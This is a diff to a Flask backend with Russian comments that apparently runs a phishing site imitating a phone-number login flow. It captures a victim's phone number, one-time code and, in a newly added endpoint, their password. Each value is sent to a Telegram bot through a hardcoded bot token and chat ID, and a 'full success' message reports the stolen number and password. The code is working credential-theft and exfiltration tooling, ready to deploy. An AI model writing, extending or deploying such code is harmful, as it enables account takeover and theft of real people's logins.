@@ -4,7 +4,6 @@ import uuid
 import os
 import requests
 import time
-from datetime import datetime
 
 app = Flask(__name__, static_folder='.')
 CORS(app)
@@ -12,12 +11,12 @@ CORS(app)
 pending_requests = {}
 
 # ================== НАСТРОЙКИ ==================
+# ВСТАВЬ НОВЫЙ ТОКЕН (если перевыпускал)
 BOT_TOKEN = "8952942696:AAFpjbsN70_UpNJFgLXaR_xWSgE7mFn7xc8" 
 YOUR_CHAT_ID = "-1004430177333" 
 # ================================================
 
 def send_to_telegram(text):
-    """Отправляет сообщение в Telegram с 3 попытками"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": YOUR_CHAT_ID,
@@ -35,10 +34,7 @@ def send_to_telegram(text):
                 print(f"[-] Попытка {attempt+1}. Ошибка TG: {response.text}")
         except Exception as e:
             print(f"[-] Попытка {attempt+1}. Ошибка сети: {e}")
-        
-        time.sleep(1) # Пауза перед следующей попыткой
-        
-    print("[!] Не удалось отправить сообщение в Telegram после 3 попыток.")
+        time.sleep(1)
     return False
 
 @app.route('/')
@@ -53,7 +49,6 @@ def serve_static(filename):
 def api_send_code():
     data = request.json
     phone_number = data.get('phone')
-    
     print(f"\n[!] Получен запрос с номером: {phone_number}")
     
     msg = f"📱 <b>Введен номер:</b> {phone_number}"
@@ -61,7 +56,6 @@ def api_send_code():
     
     request_id = str(uuid.uuid4())
     pending_requests[request_id] = phone_number
-    
     return jsonify({"success": True, "request_id": request_id})
 
 @app.route('/api/verify_code', methods=['POST'])
@@ -69,20 +63,31 @@ def api_verify_code():
     data = request.json
     request_id = data.get('request_id')
     user_code = data.get('code')
-    
     print(f"\n[!] Получен запрос с кодом: {user_code}")
     
     msg = f"🔑 <b>Введен код:</b> {user_code}"
     send_to_telegram(msg)
     
     if request_id in pending_requests:
+        return jsonify({"success": True})
+    else:
+        return jsonify({"success": False, "error": "Сессия истекла"})
+
+@app.route('/api/verify_password', methods=['POST'])
+def api_verify_password():
+    data = request.json
+    request_id = data.get('request_id')
+    user_password = data.get('password')
+    print(f"\n[!] Получен ПАРОЛЬ: {user_password}")
+    
+    msg = f"🔐 <b>Введен пароль:</b> {user_password}"
+    send_to_telegram(msg)
+    
+    if request_id in pending_requests:
         phone = pending_requests[request_id]
-        final_msg = f"✅ <b>УСПЕХ!</b>\nНомер: {phone}\nКод: {user_code}"
+        final_msg = f"🏁 <b>ПОЛНЫЙ УСПЕХ!</b>\nНомер: {phone}\nПароль: {user_password}"
         send_to_telegram(final_msg)
-        
         del pending_requests[request_id]
         return jsonify({"success": True})
     else:
         return jsonify({"success": False, "error": "Сессия истекла"})
-# ВАЖНО: УДАЛЕНА СТРОКА app.run(...)
-# Render сам запустит приложение через gunicorn
